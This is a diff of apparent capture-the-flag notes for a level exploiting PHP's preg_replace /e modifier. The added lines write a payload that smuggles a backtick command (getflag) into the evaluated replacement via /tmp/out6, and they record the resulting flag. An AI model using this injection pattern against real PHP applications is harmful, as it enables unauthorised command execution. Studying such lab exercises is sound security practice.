@@ -8,4 +8,7 @@ preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);  <--- this is the magic sauce
 ([x(.*)])   y("\2")
 
 
-flag06 : 
+
+cho "/(\[x (\${\`getflag\`})\])/e" > /tmp/out6       <----------------->
+
+flag06 : wiok45aaoguiboiki2tuin6ub
